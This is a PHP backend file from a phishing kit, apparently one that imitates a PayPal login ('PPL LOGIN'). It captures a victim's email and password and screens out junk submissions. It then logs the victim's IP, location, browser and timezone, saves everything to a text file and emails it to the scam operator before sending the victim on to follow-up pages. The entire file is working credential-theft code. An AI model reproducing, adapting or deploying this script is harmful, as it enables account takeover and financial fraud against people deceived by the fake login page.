<?php
/*
SH33NZ0 Is Dead 
                      _          _ 
__ ____ __ ____ _ _ _| |_ ___ __| |
\ \ /\ V  V / _` | ' \  _/ -_) _` |
/_\_\ \_/\_/\__,_|_||_\__\___\__,_|
                                   
Now its xWanted Time
*/
        session_start(); 
if ($_SESSION['acsh33nz0key'] !== $_POST['acsh33nz0key']) {
	     header('HTTP/1.0 404 Not Found');
}else{
include '../mine.php';
$pas=$_POST['PWD'];
if(isset($_POST['EML'])&&isset($_POST['PWD'])){
$check2 = "true";
if (strpos($pas,'fuck') !== false || strpos($pas,'1234') !== false || strpos($pas,'4321') !== false || strpos($pas,'qwer') !== false || strpos($pas,'rewq') !== false || strpos($pas,'gotofindgoodjob') !== false || strpos($pas,'stupid') !== false || strpos($pas,'spammer') !== false || strpos($pas,'fuckingspam') !== false || strpos($pas,'spam') !== false || strpos($pas,'sonofbitch') !== false || strpos($pas,'   ') !== false || strpos($pas,'googlebot') !== false) {
		$check3 = "false";
	}else{
			$check3 = "true";
	}
}
if(isset($_POST['EML'])&&isset($_POST['PWD'])){
if ($check2=="true"&&$check3=="true") {
	$_SESSION['screen']=$_POST['screen'];
	$_SESSION['EML']=$_POST['EML'];
	$msg="=========== <[ 💎 -".$scamname."- PPL LOGIN 💎 ]> ===========\r\n";
	$msg.="EMAIL		: {$_POST['EML']}\r\n";
	$msg.="PASS		: {$_POST['PWD']}\r\n";
	$msg.="---------------------- IP Info ----------------------\r\n";
	$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
	$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$msg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$msg.="=========== <[ ♥ Gift to Brother KlodVsKy ♥]> ===========\r\n\r\n\r\n";
	if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
	fwrite($save,$msg);
	fclose($save);
}
	$subject="-".$scamname."- ✅ PPL LOGIN ✅ [".$_POST['EML']."] From [".$_SESSION['ip_countryName']."]";
	$headers="From: 💎klodVsky💎 <newlogin@sh33nz0.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
		if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
}
		if ($show_unusual_activity=="yes") {
	exit(header("Location: ../../app/unusual_activity"));
}else{
	exit(header("Location: ../../app/process"));
}
}else{
	exit(header("Location: ../../app/signin?invalid"));

	}
}else{
	     header('HTTP/1.0 404 Not Found');

}
}
?>